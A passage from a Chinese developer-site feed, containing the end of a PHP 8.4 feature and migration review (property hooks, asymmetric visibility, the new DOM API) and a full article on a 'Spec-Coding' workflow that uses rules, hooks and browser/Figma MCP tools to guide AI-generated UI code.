<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">slugify</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$s</span></span>): <span class="hljs-title">string</span>
</span>{
    <span class="hljs-comment">// 真正的实现</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$s</span>));
}

<span class="hljs-title function_ invoke__">make_slug</span>(<span class="hljs-string">"Hello World"</span>);
</code></pre>
<p>这对团队来说被低估了：它给你一个标准化的方式来：</p>
<ul>
<li>标记旧的辅助函数，</li>
<li>指导内部迁移，</li>
<li>在 CI 日志中暴露弃用使用情况。</li>
</ul>
<h4 data-id="heading-15">特性：支持 HTML5 的新 DOM API（在 Dom 命名空间中）</h4>
<p>如果你在 PHP 中解析过 HTML（爬取、清理、迁移脚本），PHP 8.4 是一次有意义的升级。</p>
<p>8.4 发布公告介绍了带有标准兼容 HTML5 解析的新 DOM API、Dom 命名空间中的新类，以及方便的查询辅助函数。</p>
<p>公告中的示例展示了：</p>
<ul>
<li><code>Dom\HTMLDocument::createFromString(...)</code></li>
<li><code>querySelector(...)</code></li>
<li><code>classList-&gt;contains(...)</code></li>
</ul>
<p>一个实际用例：安全地检测"canonical"链接标签。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$doc</span> = <span class="hljs-title class_">Dom\HTMLDocument</span>::<span class="hljs-title function_ invoke__">createFromString</span>(<span class="hljs-variable">$html</span>, LIBXML_NOERROR);
<span class="hljs-variable">$canonical</span> = <span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">querySelector</span>(<span class="hljs-string">'link[rel="canonical"]'</span>);
<span class="hljs-variable">$url</span> = <span class="hljs-variable">$canonical</span>?-&gt;<span class="hljs-title function_ invoke__">getAttribute</span>(<span class="hljs-string">'href'</span>);
</code></pre>
<p>对于简单任务，这比经典的 DOMDocument + DOMXPath 组合好用得多，它减少了没人想维护的"XPath 意大利面"脚本。</p>
<h4 data-id="heading-16">特性：PDO 驱动特定子类（更精确的 API）</h4>
<p>PHP 8.4 引入了驱动特定的 PDO 子类，如 <code>Pdo\MySql</code>、<code>Pdo\Pgsql</code>、<code>Pdo\Sqlite</code> 等，并在发布公告中展示了新的连接风格。</p>
<p>在 PHP 8.4 示例中：</p>
<ul>
<li><code>PDO::connect(...)</code> 返回 <code>Pdo\Sqlite</code></li>
<li>驱动特定方法只存在于相关的地方</li>
</ul>
<p>这改善了正确性和 IDE 支持，特别是在测试和生产混用不同驱动的代码库中。</p>
<h4 data-id="heading-17">附加：Lazy objects（主要用于框架和基础设施代码）</h4>
<p>PHP 8.4 还引入了 lazy objects 概念：初始化被延迟到访问时才进行的对象。迁移指南明确指出框架可以利用它们来延迟获取依赖或数据。</p>
<p>它甚至展示了使用 <code>ReflectionClass::newLazyGhost(...)</code> 的核心机制。</p>
<p>这不是你在日常应用代码中会天天用的东西，但如果你做：</p>
<ul>
<li>DI 容器，</li>
<li>ORM，</li>
<li>代理层，</li>
<li>或对性能敏感的 bootstrap，</li>
</ul>
<p>…值得知道它的存在，因为你会在生态系统内部看到它。</p>
<h3 data-id="heading-18">PHP 8.4 如何改变 OOP 风格（尤其是 DTO）</h3>
<p>如果你写 PHP 很多年，你可能经历过至少三种 DTO 风格：</p>
<ol>
<li>"到处都是 public 属性"</li>
<li>"所有东西都是私有属性 + getter/setter"</li>
<li>"readonly 提升属性"（好用，但死板）</li>
</ol>
<p>PHP 8.4 增加了第四种，非常实用：</p>
<ul>
<li>public 读，</li>
<li>受控写，</li>
<li>不变量靠近数据。</li>
</ul>
<h4 data-id="heading-19">8.4 之前：常见的 DTO 样板代码</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateUserCommand</span>
</span>{
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;email = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$email</span>));
        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$name</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name === <span class="hljs-string">''</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Name is required.'</span>);
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">email</span>(<span class="hljs-params"/>): <span class="hljs-title">string</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;email; }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"/>): <span class="hljs-title">string</span> </span>{ <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;name; }
}
</code></pre>
<p>没什么问题。只是重复，特别是在几十个消息对象上。</p>
<h4 data-id="heading-20">8.4 之后："public 读 + private 写 + hooks"</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateUserCommand</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span> {
        set =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>));
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(set) <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span> {
        set {
            <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$value</span>);
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$v</span> === <span class="hljs-string">''</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Name is required.'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$v</span>;
        }
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$email</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>)
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;email = <span class="hljs-variable">$email</span>;
        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
    }
}
</code></pre>
<p>你得到：</p>
<ul>
<li>强类型</li>
<li>集中化的规范化/验证</li>
<li>Public 可读性（在模板、日志、序列化器中方便）</li>
<li>没有访问器样板</li>
</ul>
<p>而且你仍然可以用测试保持严格。</p>
<h4 data-id="heading-21">一个现实的"DTO + 派生属性"模式</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Address</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$line1</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) ?<span class="hljs-keyword">string</span> <span class="hljs-variable">$line2</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$city</span>,
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$singleLine</span> {
        get =&gt; <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$this</span>-&gt;line1 . <span class="hljs-string">' '</span> . (<span class="hljs-variable">$this</span>-&gt;line2 ?? <span class="hljs-string">''</span>) . <span class="hljs-string">', '</span> . <span class="hljs-variable language_">$this</span>-&gt;city);
    }
}
</code></pre>
<p>你可以保持存储字段干净，并提供一个友好的派生字段而不引入额外方法。</p>
<h4 data-id="heading-22">readonly 仍然胜出的场景</h4>
<p>因为 hooks 不能和 readonly 一起用，不可变值对象仍然依赖：</p>
<ul>
<li>readonly 提升属性</li>
<li>工厂</li>
<li>显式的 <code>withX()</code> 方法（在 PHP 8.5 里更好用了，但那是另一篇文章的事）</li>
</ul>
<p>所以很多团队的实际分工是：</p>
<ul>
<li><strong>值对象</strong>：readonly + 显式行为</li>
<li><strong>DTO / 命令 / 请求</strong>：非对称可见性 + hooks</li>
</ul>
<h3 data-id="heading-23">经常影响测试/CI 的简短兼容性说明</h3>
<p>这一节故意简短，但是能省时间的那种简短。</p>
<h4 data-id="heading-24">错误报告级别：E_STRICT 没了</h4>
<p>PHP 8.4 移除了 E_STRICT 错误级别，E_STRICT 常量已弃用。</p>
<p>如果你有遗留代码或配置引用了 E_STRICT，可能会看到 CI 行为变化。</p>
<h4 data-id="heading-25">JIT 配置默认值变了（OPcache）</h4>
<p>PHP 8.4 中 JIT 配置的默认值变了：</p>
<ul>
<li>从 <code>opcache.jit=tracing</code> 和 <code>opcache.jit_buffer_size=0</code></li>
<li>到 <code>opcache.jit=disable</code> 和 <code>opcache.jit_buffer_size=64M</code></li>
</ul>
<p>这不会改变"JIT 默认关闭"，但可能影响之前只切换其中一个值的环境。</p>
<h4 data-id="heading-26">一些扩展变得更严格（类型化常量、ValueError、行为变更）</h4>
<p>8.4 不兼容列表中的一些例子：</p>
<ul>
<li>几个扩展类常量现在有类型（Date、Intl、PDO、Reflection、SPL、Sqlite、XMLReader）。</li>
<li>一些函数现在抛 ValueError 而不是静默接受无效输入（如 <code>round()</code> 无效模式、<code>str_getcsv()</code> 无效分隔符长度）。</li>
<li>SimpleXML 迭代行为变了以避免意外的 rewind（之前可能导致无限循环）。</li>
<li>根据驱动，一些 PDO 属性现在表现为布尔而非整数。</li>
</ul>
<p>这些是那种除非你尽早在 8.4 下运行测试套件，否则会表现为"随机测试失败"的变更。</p>
<h3 data-id="heading-27">小型迁移：采用 PHP 8.4 的小步骤，无需大重构</h3>
<p>如果你还没上 8.4——或者上了但没用这些特性——这是一个通常有效的安全顺序。</p>
<h4 data-id="heading-28">步骤 1：先把 8.4 加到 CI，即使生产还没准备好</h4>
<p>确保你能在 8.4 上运行测试套件而不出意外。把警告和弃用当作信号。</p>
<h4 data-id="heading-29">步骤 2：只在新代码中采用 array_find / array_any / array_all</h4>
<p>不要重构整个代码库。只是不要再写新的"foreach-with-break"循环，除非它们真的更清晰。</p>
<h4 data-id="heading-30">步骤 3：对新的 DTO 和请求对象使用非对称可见性</h4>
<p>这是低风险的：你主要是改变属性声明并消除一类意外修改。</p>
<h4 data-id="heading-31">步骤 4：在明显替代样板代码的地方添加 property hooks</h4>
<p>从以下开始：</p>
<ul>
<li>trim 和大小写规范化，</li>
<li>简单验证，</li>
<li>派生属性。</li>
</ul>
<p>一开始避免在 hooks 里放重逻辑。</p>
<h4 data-id="heading-32">步骤 5：用 #[Deprecated] 进行内部 API 清理</h4>
<p>用清晰的消息标记旧方法和辅助函数。在 CI 日志中跟踪使用情况。让弃用可操作。</p>
<h4 data-id="heading-33">步骤 6：只在脚本或隔离模块中采用新 DOM API</h4>
<p>如果你的应用做 HTML 解析，新 API 可能是很大的改进——但一开始保持采用范围受限。</p>
<h4 data-id="heading-34">步骤 7：把 lazy objects 留给框架/基础设施层</h4>
<p>知道这个特性存在。不要强行塞进应用代码，除非你有非常具体的性能或架构原因。</p>
<h3 data-id="heading-35">通往 PHP 8.5 的桥梁（为什么 8.4 让下一步更容易）</h3>
<p>一旦你的团队熟悉了 PHP 8.4 的"现代基线"：</p>
<ul>
<li>DTO 因为非对称可见性 + hooks 变得更干净</li>
<li>弃用策略因为 <code>#[Deprecated]</code> 变得更系统化</li>
<li>数组重型代码可以用原生辅助函数表达得更清晰</li>
<li>HTML 解析和工具脚本变得不那么痛苦</li>
</ul>
<p>这个基线减少了迁移到 PHP 8.5 的摩擦，因为你已经现代化了代码库中对象和日常工具的写法。PHP 8.5 就不再是"追赶"，而是选择性地采用改进。</p>
<h3 data-id="heading-36">结论</h3>
<p>PHP 8.4 不是一个"跳过它，直接上 8.5"的版本。在 2026 年，它仍然是一个明智的基线，因为它受支持、广泛相关，而且它改变了日常 PHP 的人体工学——尤其是在 OOP 密集的代码库中。</p>
<p>如果你从这篇回顾中只带走一件事，那就是 property hooks——但要带着意图使用：</p>
<ul>
<li>用它们做不变量、规范化和干净的派生值，</li>
<li>把它们和非对称可见性配对做实用的 DTO，</li>
<li>让 hooks 保持无聊（往好的方向）。</li>
</ul>
<p>这个组合让你今天就有更干净的 8.4 代码库——以及准备好时通往 8.5 的更平滑路径。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度实践：Spec-Coding，AI 独立完成复杂 UI 开发的可行性方案]]></title>    <link>https://juejin.cn/post/7594389431835541545</link>    <guid>https://juejin.cn/post/7594389431835541545</guid>    <pubDate>2026-01-13T03:51:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389431835541545" data-draft-id="7594420277448785947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度实践：Spec-Coding，AI 独立完成复杂 UI 开发的可行性方案"/> <meta itemprop="keywords" content="前端,AI编程,VibeCoding"/> <meta itemprop="datePublished" content="2026-01-13T03:51:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="猪猪拆迁队"/> <meta itemprop="url" content="https://juejin.cn/user/2541726613638973"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度实践：Spec-Coding，AI 独立完成复杂 UI 开发的可行性方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2541726613638973/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    猪猪拆迁队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T03:51:02.000Z" title="Tue Jan 13 2026 03:51:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">核心协作流程图</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    %% 阶段 0: 启动与深度探测
    Start[输入原型 URL / 新页面需求] --&gt; HookB_Probe[激活 Hook B: 视觉协议桥接]
    
    subgraph MCP_Layer [MCP 感知层: AI 的五感]
        MCP_Nav[navigate_page: 访问原型]
        MCP_Snap[take_snapshot: DOM 审计]
        MCP_Shot[take_screenshot: 视觉采样]
    end

    HookB_Probe --&gt; MCP_Nav
    MCP_Nav --&gt; MCP_Snap
    MCP_Snap --&gt; MCP_Shot

    %% 阶段 1: Spec 生成与动态校准
    MCP_Shot --&gt; Spec_Gen[生成结构化 Spec &amp; Task.md]
    
    subgraph Dynamic_Alignment [动态校准闭环]
        Spec_Gen --&gt;|循环采样探测| MCP_Snap
        MCP_Snap --&gt;|特征反馈| Spec_Gen
    end

    %% 阶段 2: 规则注入
    Spec_Gen --&gt; Rules_Layer[Rules 注入: AI 驱动 UI 实现严格规范]
    
    subgraph Core_Rules [核心底线约束]
        R1[组件映射: FuncTable/DyForm]
        R2[视觉规范: Dark Mode/禁绿令]
        R3[架构模式: MVC 分离/i18n]
    end
    
    Rules_Layer -.-&gt; R1 &amp; R2 &amp; R3
    R1 &amp; R2 &amp; R3 -.-&gt;|微调任务细则| Spec_Gen

    %% 阶段 3: 增量任务执行
    Spec_Gen --&gt; Task_Anchor[配置环境锚点: 双网址锁定]
    Task_Anchor --&gt; Task_Exec[原子任务执行: 阶段 1-4]

    %% 阶段 4: 执行中的 Hook 校验
    subgraph Task_Hook [任务执行 UI Hook 闭环]
        T_Before[执行前: MCP 记录状态]
        T_Code[生成并应用代码]
        T_After[执行后: MCP 截图对比]
        
        T_Before --&gt; T_Code --&gt; T_After
    end

    Task_Exec --&gt; T_Before
    T_After --&gt;|存在偏差| T_Code
    T_After --&gt;|校验一致| Delivery[高质量交付 &amp; 代码合并]

    %% 样式定义
    style MCP_Layer fill:#e1f5fe,stroke:#01579b
    style Core_Rules fill:#fff3e0,stroke:#e65100
    style Task_Hook fill:#f3e5f5,stroke:#4a148c
    style Dynamic_Alignment stroke-dasharray: 5 5
</code></pre>
<h2 data-id="heading-1">一、 为什么 Spec 实践是 AI 开发质量的终极保证？</h2>
<p>在 AI 开发的早期，我们往往追求“一句话生成页面”。但回到真实的业务场景，这种方式产出的代码几乎不可用。AI 会产生严重的<strong>幻觉</strong>，或者为了追求视觉一致性而进行无意义的<strong>过度设计</strong>。</p>
<p>通过 <strong>Spec-Coding (规范驱动)</strong> 协议的实践，我们并不是在寻找一种“最聪明”的模型，而是构建一套<strong>质量与效率的确定性底线</strong>：</p>
<ul>
<li><strong>消除幻觉约束</strong>：Spec 为 AI 提供了清晰的操作边界，防止其随意引入非标库、手写原生 HTML 或滥用内联样式。</li>
<li><strong>解决逻辑断层</strong>：通过预定义的架构协议，确保 AI 生成的代码逻辑自洽，而非一堆无法运行的 UI 占位符。</li>
<li><strong>规模化交付的共性</strong>：当团队所有 AI 开发都遵循同一套 Spec，产出的代码在可维护性和一致性上能达到高度统一，避免了“千人千面”的代码污染。</li>
</ul>
<hr/>
<h2 data-id="heading-2">二、 核心架构：Rules, Hook &amp; MCP 的协同链路</h2>
<p>该方案的可行性核心在于将“人眼识别的规范”转化为“机器执行的自动化指令”。我们建立了一份**《AI 驱动：UI 实现与任务执行严格规范》**作为核心指导文档。其底层逻辑如下：</p>
<h3 data-id="heading-3">1. 协作流程图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[原型输入 URL/链接] --&gt; B{是否有 Figma 设计稿?}
    B -- 无 Figma / 只有原型 --&gt; C[激活 Hook B: 深度探测]
    B -- 有 Figma --&gt; D[DLS 变量映射 &amp; 截图还原]
    
    C --&gt; E[MCP Chrome DevTools]
    E --&gt; F[核心意图识别]
    
    F --&gt; G[生成结构化 Spec &amp; Task.md]
    G -.-&gt;|不断调用 MCP 采样校验| E
    
    G --&gt; H[Rules 约束注入: UI 实现严格规范]
    H -.-&gt;|根据规范微调任务细则| G
    
    H --&gt; I[原子任务执行]
    I --&gt; J[Hook A: 合规性自检]
    J --&gt; K[MCP 循环校验]
    
    K -- 视觉/代码偏差 --&gt; I
    K -- 校验通过 --&gt; L[高质量交付]
</code></pre>
<h3 data-id="heading-4">2. 三大支柱的职责分工</h3>
<ul>
<li><strong>Rules (规则层)</strong> ：以《AI 驱动：UI 实现与任务执行严格规范》为准则，定义了视觉底线、组件映射规则（如强制复用标准表格/表单组件）以及架构模式（如 MVC 分离），确保 AI 输出不偏离团队基建。</li>
<li><strong>Hook (钩子层)</strong> ：作为“拦截器”，在代码写入前校验组件复用、样式原子化及请求模式，并负责从视觉信号到开发任务的翻译。</li>
<li><strong>MCP (能力层)</strong> ：赋予 AI “五感”。通过 <strong>Chrome DevTools MCP</strong>，让 AI 能够实时感知浏览器真实的运行环境，解决“盲目编码”带来的视觉与逻辑偏差。</li>
</ul>
<hr/>
<h2 data-id="heading-5">三、 深度实践中的难点与破解之道</h2>
<p>在跑通这一链路的过程中，我们重点攻克了几个令开发者头疼的工程难题：</p>
<h3 data-id="heading-6">1. 解决 UI 还原与组件抽象的冲突</h3>
<ul>
<li><strong>难点</strong>：AI 倾向于通过堆砌 CSS 实现像素级还原，这往往导致嵌套极深、难以维护。</li>
<li><strong>解决</strong>：利用 <strong>MCP 视觉审计</strong>，将页面拆解为组件树。AI 必须先确认布局重心，再应用 Rules 进行组件映射。这意味着 AI 会优先思考“这里该用哪个公共组件”，而不是“这里该写哪个 CSS 属性”。</li>
</ul>
<h3 data-id="heading-7">2. 规避代码不可用与逻辑空洞</h3>
<ul>
<li><strong>难点</strong>：生成的代码往往缺失 Loading、Error 处理或 API 链路不通。</li>
<li><strong>解决</strong>：实施 <strong>“环境锚点”强制化</strong>。在 Task 顶部锁定预览地址，AI 在生成每一阶段逻辑后，必须通过 MCP 回访页面验证交互是否闭环，而非一次性“盲写”到底。</li>
</ul>
<h3 data-id="heading-8">3. 处理“只有原型，没有设计稿”的极端情况</h3>
<p>这是最能体现方案可行性的场景。当手中只有一个运行中的 Web 原型 URL 时，通过 <strong>Hook B 驱动 MCP 探测</strong>，AI 能自动提取 DOM 结构和交互链路，生成高度还原的 Spec。这在老旧项目重构或竞品分析场景下极大地降低了 UI 逆向工程的成本。</p>
<hr/>
<h2 data-id="heading-9">四、 两种实践路径的体验总结</h2>
<h3 data-id="heading-10">场景 A：无 Figma，只有 Web 原型 (对齐模式)</h3>
<p>在这种场景下，我们通过 <strong>Chrome DevTools MCP</strong> 强行补齐了信息差。AI 通过“观察”原型的 Spacing 节奏和交互反馈，实现了高保真的代码重构。虽然过程涉及多轮 Hook 校验，但产出的代码健壮性远超人工手动临摹。</p>
<h3 data-id="heading-11">场景 B：基于 Figma (MCP 驱动模式)</h3>
<p>当拥有 Figma 时，通过<strong>Figma MCP</strong>的<strong>DLS (Design Language System) 变量</strong>与截图，还原度可直接达到 95% 以上。此时 AI 的工作重心不再是像素，而是转向 <strong>Rules 合规性</strong>，重点确保 API 请求模式、控制器逻辑完全符合团队的工程标准。</p>
<hr/>
<h2 data-id="heading-12">五、 总结：AI 开发的本质是协议的胜利</h2>
<p>通过本次实践，我们发现：如果说大模型的能力决定了生成的<strong>上限</strong>，那么严密的协议则决定了交付的<strong>下限</strong>。协议的作用，是让 AI 在处理复杂业务时，从<strong>随机的灵感闪现</strong>转化为<strong>稳定的工程输出</strong>。</p>
<p>折腾完这一整套体系后，最直观的感受是：AI 编程终于从‘抽卡撞运气’变成了‘照方抓药’。当模型能力（智商）足够强时，这套 Spec 就像是一条工业传送带，把 AI 那些天马行空的幻觉收拢进工程规范里。毕竟对我们业务开发来说，一个听话、稳定、不乱写代码的 AI，远比一个偶尔能写出‘神来之笔’但大多时候在挖坑的 AI 要靠谱得多</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lottie-web 源码解析（一）：从 JSON Schema 认识 Lottie 动画的本质📒]]></title>    <link>https://juejin.cn/post/7594389937463033866</link>    <guid>https://juejin.cn/post/7594389937463033866</guid>    <pubDate>2026-01-13T02:34:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937463033866" data-draft-id="7583980250734116927" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 